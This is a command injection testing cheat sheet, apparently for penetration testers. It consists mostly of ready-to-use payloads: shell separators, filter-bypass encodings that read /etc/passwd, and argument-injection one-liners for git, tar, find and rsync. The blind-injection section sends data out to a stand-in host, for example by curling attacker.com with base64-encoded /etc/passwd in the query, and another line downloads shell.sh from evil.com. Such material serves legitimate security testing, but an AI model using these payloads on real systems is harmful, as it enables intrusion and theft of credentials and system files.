# Command Injection Testing Methodology

## Quick Reference

**Basic Payloads:**
```bash
; ls
| ls
`ls`
$(ls)
& ls
&& ls
|| ls
```

**Blind Detection:**
```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 attacker.com
```

---

## Injection Types

### Command Chaining
Multiple commands in sequence using separators.

### Command Substitution
Embedding command output into another command.

### Argument Injection
Injecting additional arguments to modify command behavior.

---

## Injection Operators

### Unix/Linux

| Operator | Description | Example |
|----------|-------------|---------|
| `;` | Command separator | `ls; whoami` |
| `\|` | Pipe output | `cat file \| grep x` |
| `&` | Background execution | `ls & whoami` |
| `&&` | AND - run if first succeeds | `ls && whoami` |
| `\|\|` | OR - run if first fails | `ls \|\| whoami` |
| `` `cmd` `` | Command substitution | ``echo `whoami` `` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `$((expr))` | Arithmetic | `$((1+1))` |
| `\n` | Newline separator | `ls%0awhoami` |
| `>` | Output redirect | `ls > /tmp/out` |
| `<` | Input redirect | `cmd < /etc/passwd` |
| `>>` | Append output | `echo x >> file` |

### Windows

| Operator | Description | Example |
|----------|-------------|---------|
| `&` | Command separator | `dir & whoami` |
| `&&` | AND | `dir && whoami` |
| `\|` | Pipe | `dir \| findstr x` |
| `\|\|` | OR | `dir \|\| whoami` |
| `%0a` | Newline | `dir%0awhoami` |
| `;` | Not a separator in CMD | - |

---

## Context Patterns

### Pattern 1: Direct Command Execution

**Code:** `system("ping " + input)`

**Payloads:**
```bash
; ls
; cat /etc/passwd
| ls
`id`
$(id)
; sleep 5     # Blind detection
```

### Pattern 2: Quoted Arguments

**Code:** `system("ping '" + input + "'")`

**Payloads:**
```bash
'; ls '
'; ls #
'$(id)'
`id`
'; sleep 5 #
```

### Pattern 3: Double-Quoted Arguments

**Code:** `system("ping \"" + input + "\"")`

**Payloads:**
```bash
"; ls "
"; ls #
"$(id)"
`id`
"; sleep 5 #
```

### Pattern 4: Command in Variable

**Code:** `system("$cmd " + args)`

**Payloads:**
```bash
# If $cmd is controllable
/bin/ls
/bin/cat /etc/passwd
```

### Pattern 5: Argument Injection

**Code:** `system("tar -cf archive.tar " + filename)`

**Payloads:**
```bash
--checkpoint=1 --checkpoint-action=exec=id
-I 'id' -cf /dev/null /dev/null
```

---

## Bypass Techniques

### Blacklist Bypass

**Space alternatives:**
```bash
cat</etc/passwd
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd       # Tab
X=$'cat\x20/etc/passwd'&&$X
```

**Command alternatives:**
```bash
# Instead of cat
/bin/cat
/???/c?t
/???/ca?
tac
head
tail
less
more
nl
xxd
base64

# Instead of ls
/bin/ls
dir
echo *
find . -maxdepth 1
```

**Slash alternatives:**
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

### Encoding Bypass

**Hex encoding:**
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | xargs cat
# /etc/passwd
```

**Octal encoding:**
```bash
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
# cat /etc/passwd
```

**Base64:**
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
# cat /etc/passwd
```

**URL encoding (for web):**
```
%3B%20ls            # ; ls
%7C%20ls            # | ls
%60ls%60            # `ls`
%24%28ls%29         # $(ls)
```

### Quote Bypass

```bash
c""at /etc/passwd
c''at /etc/passwd
c\at /etc/passwd
```

### Variable Concatenation

```bash
a=c;b=at;$a$b /etc/passwd
```

### Wildcard Abuse

```bash
/???/c?t /???/p??s??
# Matches /bin/cat /etc/passwd
```

### Environment Variables

```bash
# $PATH typically contains /usr/bin
${PATH:0:1}bin${PATH:0:1}ls
# Becomes /bin/ls

# Using HOME
${HOME:0:1}etc${HOME:0:1}passwd
# Becomes /etc/passwd
```

---

## Blind Command Injection

### Time-Based

```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

### Out-of-Band (DNS)

```bash
; nslookup attacker.com
; host attacker.com
; dig attacker.com
`nslookup attacker.com`
$(nslookup $(whoami).attacker.com)
```

### Out-of-Band (HTTP)

```bash
; curl http://attacker.com/
; wget http://attacker.com/
`curl http://attacker.com/?data=$(whoami)`
$(curl http://attacker.com/?data=$(cat /etc/passwd | base64))
```

### File Creation

```bash
; touch /tmp/pwned
; echo pwned > /tmp/test
```

---

## Framework-Specific Vectors

### PHP

Vulnerable functions:
```php
system($cmd)
exec($cmd)
shell_exec($cmd)
passthru($cmd)
popen($cmd, 'r')
proc_open($cmd, $descriptorspec, $pipes)
pcntl_exec($path, $args)
`$cmd`  // Backticks
```

### Python

Vulnerable functions:
```python
os.system(cmd)
os.popen(cmd)
subprocess.call(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
commands.getoutput(cmd)  # Python 2
```

### Node.js

Vulnerable functions:
```javascript
child_process.exec(cmd)
child_process.spawn(cmd, {shell: true})
child_process.execSync(cmd)
```

### Ruby

Vulnerable functions:
```ruby
system(cmd)
exec(cmd)
`cmd`
%x(cmd)
IO.popen(cmd)
Open3.popen3(cmd)
```

### Java

Vulnerable:
```java
Runtime.getRuntime().exec(cmd)
ProcessBuilder(cmd).start()
```

---

## Argument Injection

### Git

```bash
git clone -c protocol.ext.allow=always ext::sh -c 'id>/tmp/pwned' x
git clone '--upload-pack=touch /tmp/pwned' repo
```

### Tar

```bash
tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=id file
```

### Curl

```bash
curl -o /tmp/shell.sh http://evil.com/shell.sh
curl -K /etc/passwd  # Read as config
```

### Find

```bash
find / -exec id \;
find / -name x -exec sh -c 'id' \;
```

### Rsync

```bash
rsync -e 'sh -c id' src dest
```

---

## Windows-Specific

### Command Separators
```cmd
& whoami
&& whoami
| whoami
|| whoami
```

### Command Substitution (PowerShell)
```powershell
$(whoami)
```

### Environment Variables
```cmd
%COMSPEC% /c whoami
cmd /c whoami
powershell -c "whoami"
```

### Bypass Techniques
```cmd
# Using caret for escape
w^h^o^a^m^i

# Using quotes
who""ami
who''ami

# Environment variable
set x=who && set y=ami && %x%%y%
```

---

## Verification Checklist

1. **Identify injection point:**
   - [ ] Parameter passed to system command
   - [ ] File upload with command processing
   - [ ] Import/export functionality

2. **Detect vulnerability:**
   - [ ] Time-based: `sleep 5` causes delay
   - [ ] Out-of-band: DNS/HTTP callback received
   - [ ] Direct output in response

3. **Determine context:**
   - [ ] Direct injection
   - [ ] Inside quotes (single/double)
   - [ ] Argument injection

4. **Bypass filters:**
   - [ ] Alternative operators
   - [ ] Encoding variations
   - [ ] Space alternatives

5. **Document evidence:**
   - [ ] Command output or timing proof
   - [ ] Working payload
   - [ ] Affected endpoint and parameter
